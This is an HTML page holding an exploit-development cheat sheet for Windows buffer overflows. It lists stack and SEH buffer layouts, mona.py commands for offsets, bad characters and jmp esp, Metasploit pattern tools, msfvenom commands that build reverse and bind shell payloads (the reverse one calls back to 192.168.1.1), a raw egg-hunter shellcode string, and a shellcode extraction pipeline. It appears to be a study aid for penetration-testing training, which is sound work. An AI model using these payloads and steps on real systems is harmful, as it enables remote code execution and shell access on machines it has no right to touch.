<html>
  <body>
<pre>
#Stack Overflow
buffer = junk+ret+shellcode
buffer = "A"*780+"B"*4+"C"*198

#SEH 
buffer = junk + nseh + seh + shellcode
buffer = "A"*1200 + "B"*4 + "C"*4 + "D"*349


# Mona commands
!mona config -set workingfolder c:\logs\%p  # set your working folder
!mona pc 26168 # generate unique pattern of 26168
!mona findmsp # finds the offset of unique pattern or cyclic pattern in memory, registers
!mona jmp -r esp # find instructions which jump to esp like jmp esp, call esp etc.,
!mona bytearray # create byte array from 00 to ff for bad character analysis
!mona compare -f C:\logs\something\bytearray.bin -a 0012ADAD # analyze bytes from 0012ADAD
!mona bytearray -cpb "\x00\x0a\x0d" #Generate bytearray without those bad bytes "\x00\x0a\x0d"
!mona seh # gives you pop pop ret to get to nseh
!mona assemble -s "pop eax#push ebx#mov ebp,esp" #Converts given assembly instructions(sparated by "#") into opcode
!mona find -type asc -s "w00t"  #find string w00t
more commands @https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/

#WinDbg Commad
bp 0xsomeaddress #set breakpoint


#metasploit 
#Alternate way for createing unique pattern for finding offset
cd /usr/share/metasploit-framework/tools/
./pattern_create -l 2000
./pattern_offset -q PATTERN

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4321 -e x86/shikata_ga_nai -b "\x00\x0d\x0a\x3d\x5c\x2f" -i 3 -f python
msfvenom -p windows/shell_bind_tcp LPORT=4321 -e x86/shikata_ga_nai -b "\x00\x0d\x0a" -i 3 -f c


#Egg Hunter:
\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7

#Compile & Get Shellcode from binary:
nasm -f elf32 -o objfilename.o filename.nasm
objdump -d filename.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'


</pre>
</body>
</html>  
74.116.102.31/nph-mr.cgi
74.116.102.31  


